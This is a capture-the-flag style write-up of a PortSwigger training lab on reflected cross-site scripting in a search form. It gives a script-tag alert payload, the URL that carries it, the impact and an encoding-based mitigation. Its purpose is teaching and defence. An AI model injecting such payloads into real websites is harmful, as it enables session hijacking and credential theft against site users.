# Reflected XSS into HTML context with nothing encoded

**Source:** [PortSwigger](https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded)  
**Category:** XSS  
**Difficulty:** APPRENTICE

## Objective
To solve the lab, perform a cross-site scripting attack that calls the `alert` function.

## Vulnerability
This lab contains a simple reflected cross-site scripting vulnerability in the search functionality.

## Exploitation

### Steps
1. Entered the lab and noticed the search form.
2. Entered the formula `<script>alert('test')</script>` into the form, the script executed.

### Payload
```js
<script>alert('test')</script>
```

```http
/?search=<script>alert('test')</script>
```

### Shortcut
1. Navigate to the lab URL and append the payload directly to the URL: 
```http
/?search=<script>alert('test')</script>`
```
2. Press Enter and observe the alert popup.

## Impact
An attacker could execute arbitrary JavaScript in the victim's browser, potentially leading to session hijacking, credential theft, or defacement of the page.

## Mitigation
Encode all user input before reflecting it into the HTML response, specifically encoding characters like `<`, `>`, `"`, `'`, and `&` into their HTML entities.

## Tools
- Browser

## Notes
The vulnerability exists because the application reflects user input without any encoding or sanitization, allowing direct injection of HTML and JavaScript.